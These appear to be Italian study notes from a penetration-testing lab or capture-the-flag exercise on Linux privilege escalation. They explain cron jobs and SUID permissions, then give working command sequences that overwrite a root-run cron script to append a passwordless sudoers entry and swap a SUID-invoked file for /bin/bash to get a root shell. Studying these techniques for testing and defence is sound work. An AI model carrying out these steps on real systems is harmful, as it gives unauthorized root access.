#### Cron Jobs
```
# Cron Jobs
Linux implementa la pianificazione delle attività tramite un'utilità chiamata Cron.
● Cron è un servizio basato sul tempo che esegue applicazioni, script e altri comandi
ripetutamente secondo un programma specificato.
● Un'applicazione o uno script configurato per essere eseguito ripetutamente con Cron
è noto come lavoro Cron. Cron può essere utilizzato per automatizzare o ripetere un'ampia varietà di funzioni su un sistema, dai backup giornalieri agli aggiornamenti e alle patch del sistema.
● Il file crontab è un file di configurazione utilizzato dall'utilità Cron per archiviare e tenere traccia dei lavori Cron che sono stati creati.

Cron Job possono anche essere eseguiti come qualsiasi utente sul sistema, questo è molto importante fattore da tenere d'occhio poiché prenderemo di mira i lavori Cron che sono stati configurato per essere eseguito come utente "root".
● Ciò è dovuto principalmente al fatto che qualsiasi script o comando eseguito da un processo Cron verrà eseguito come utente root e di conseguenza ci fornirà l'accesso root.
● Per elevare i nostri privilegi, dovremo trovare e identificare i lavori cron
pianificato dall'utente root o dai file elaborati dal processo cron.


Il mio obiettivo è poter diventare root, devo cercare dei file sul quale ho i permessi di write + execute + file o cron job task che vanno a scrivere dei file con permessi da root che verranno poi eseguiti per poter elevare i miei privilegi andando magari a inserire il mio user all'interno dei sudoers.



Oppure posso cercare un file sul quale solo l'utente root ha i permessi.
Cercare altri file con lo stesso nome, o file che contengono al loro interno il nome del file (magari c'è qualche file .sh che va a creare/aggiornare quel file ogni tot minuti).
Es. Stesso file presente in /tmp, che potrebbe suggerire che c'è un processo cron, che ogni tot minuti prende il file da /tmp e lo copia inserendolo in un'altra directory.
In questo modo posso cercare come viene scritto quel file in /tmp, per andare a cercare dei file .sh che lo scrivono in modo che quando verrà eseguito quel file, verranno eseguiti comandi arbitrari da root che ho precedentemente inserito (es. nuovi utenti sudoers no passwd in /etc/sudoers). 


# Posso cercare file presenti sia nella /tmp, che in altre directory (simboleggia magari che quei file vengono overwritten ogni tot minuti).

# File "message" with -rw- root root permissions - Find other file:
> find / -name "message" 2>/dev/null
[ Ottengo /tmp/message ]

# Questo significa che ci sarà un scripts/binary che copia il file "message" da /tmp in /Desktop. Solitamente posso usare directory come "/etc", "/opt", "/usr".
# Greppo per cercare file di shell che avranno come ouput quella cartella nel bash:


> grep -nri "/tmp/message" /usr
[ Ottengo  file .sh in /usr/local/share/copy.sh] 

Sulla shell ho i permessi di scrittura, non ho un text editor sul systema quindi uso le echo/printf:

> printf '#!/bin/bash\necho "student ALL=NOPASSWD:ALL" >> /etc/sudoers' > /usr/local/share/copy.sh

> cat /usr/local/share/copy.sh
echo "student ALL=NOPASSWD:ALL" >> /etc/sudoers

> sudo -l

> sudo su
Got root priviledges
get the flag


```


#### SUID
SUID (Set User ID upon execution) è un tipo speciale di permessi dati a un file in sistemi Unix e Linux. Normalmente, quando un programma viene eseguito, eredita i permessi di accesso dall’utente che ha effettuato l’accesso. Tuttavia, con SUID, il programma viene eseguito con i privilegi del proprietario del file eseguibile1.

Ecco alcuni punti chiave riguardanti SUID:

Utilizzo di SUID:
Quando il bit SUID è impostato su un file eseguibile, significa che il file verrà eseguito con gli stessi privilegi del proprietario del file eseguibile.
Ad esempio, se un utente normale esegue un programma con SUID impostato da un utente con privilegi di amministratore, quel programma verrà eseguito con i privilegi di amministratore.

Oltre ai tre principali permessi di accesso ai file (lettura, scrittura ed esecuzione), anche Linux
fornisce agli utenti autorizzazioni specializzate che possono essere utilizzate in situazioni specifiche. Uno di questi permessi di accesso è il permesso SUID (Set Owner User ID).
● Quando applicata, questa autorizzazione fornisce agli utenti la possibilità di eseguire uno script o un file binario con le autorizzazioni del proprietario del file anziché dell'utente che esegue lo script o binario.
● Le autorizzazioni SUID vengono generalmente utilizzate per fornire agli utenti senza privilegi la possibilità di eseguire script o binari specifici con permessi di "root". È da notare però che il
la fornitura di privilegi elevati è limitata all'esecuzione dello script e non lo fa si traducono tuttavia in un'elevazione dei privilegi se gli utenti non privilegiati vengono configurati in modo errato
può sfruttare configurazioni errate o vulnerabilità all'interno del file binario o dello script per ottenere un file sessione elevata.

```
#### SUID

In order to elevate our privileges, we will need to identify an SUID binary that is owned by the "root" user.  
Uso SUID binary file al quale ho accesso, che utilizzano file o puntamenti es. welcome. Se alcuni du questi eseguono altri file es. greetings, posso creare un nuovo file greetings bash e sostuirlo al precedente. (-rwsr-xr-x)

Cerco bynary file che viene eseguito con il SUID, che simboleggia che il file binario e i suoi processi vengono runnati con privilegi da root.
Cerco eventualmente file che vengono eseguiti all'interno, in modo da poter modificare quel file e lanciare comandi da lì.

> -rwsr-xr-x welcome
> file welcome
> strings welcome
[Trovo la word "greetings" e ipotizzo vada a lanciare quel file]  

Cancello il file "greetings" e ne creo un'altro, con al suo interno il contenuto di /bin/bash (che permetterà di essere lanciato da root e spawnare una shell root):
> rm greetings
> cp /bin/bash greetings

Run welcome:
> ./welcome

Ganed shell root:
> whoami
[root]


```
